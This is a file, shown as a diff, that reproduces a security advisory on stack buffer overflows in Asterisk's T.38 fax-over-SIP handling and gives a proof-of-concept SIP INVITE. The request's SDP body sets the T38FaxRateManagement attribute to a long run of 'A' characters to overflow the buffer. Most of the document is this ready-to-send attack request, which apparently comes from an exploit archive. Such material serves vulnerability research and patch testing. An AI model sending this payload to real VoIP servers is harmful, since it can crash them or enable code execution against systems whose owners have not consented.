@@ -1,0 +1,79 @@
+source: http://www.securityfocus.com/bid/23648/info
+
+Asterisk is prone to multiple remote stack-based buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied data before copying it to insufficiently sized buffers.
+
+Successful exploits may allow an attacker to execute arbitrary machine code to compromise an affected computer or to cause denial-of-service conditions.
+
+Versions prior to Asterisk Open Source 1.4.3, AsteriskNOW Beta 6, and Asterisk Appliance Developer Kit 0.4.0 are vulnerable.
+
+NOTE: These issues occur only when 't38 fax over SIP' is enabled in 'sip.conf'. 
+
+INVITE sip:200@127.0.0.1 SIP/2.0                                     
+                                                                     
+Date: Wed, 21 Mar 2007 4:20:09 GMT                                   
+                                                                     
+CSeq: 1 INVITE                                                       
+                                                                     
+Via: SIP/2.0/UDP                                                     
+                                                                     
+10.0.0.123:5068;branch=z9hG4bKfe06f452-2dd6-db11-6d02-000b7d0dc672;rport
+                                                                     
+User-Agent: NGS/2.0                                                  
+                                                                     
+From: "Barrie Dempster"                                              
+                                                                     
+<sip:zeedo@10.0.0.123:5068>;tag=de92d852-2dd6-db11-9d02-000b7d0dc672 
+                                                                     
+Call-ID: f897d952-2fa6-db49441-9d02-001b7d0dc672@hades               
+                                                                     
+To: <sip:200@localhost>                                              
+                                                                     
+Contact: <sip:zeedo@10.0.0.123:5068;transport=udp>                   
+                                                                     
+Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE            
+                                                                     
+Content-Type: application/sdp                                        
+                                                                     
+Content-Length: 796                                                  
+                                                                     
+Max-Forwards: 70                                                     
+                                                                     
+v=0                                                                  
+                                                                     
+o=rtp 1160124458839569000 160124458839569000 IN IP4 127.0.0.1        
+                                                                     
+s=-                                                                  
+                                                                     
+c=IN IP4 127.0.0.1                                                   
+                                                                     
+t=0 0                                                                
+                                                                     
+m=image 5004 UDPTL t38                                               
+                                                                     
+a=T38FaxVersion:0                                                    
+                                                                     
+a=T38MaxBitRate:14400                                                
+                                                                     
+a=T38FaxMaxBuffer:1024                                               
+                                                                     
+a=T38FaxMaxDatagram:238                                              
+                                                                     
+a=T38FaxRateManagement:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA      
+                                                                     
+AAAAAAAAAAAAAAAA                                                     
+                                                                     
+a=T38FaxUdpEC:t38UDPRedundancy  
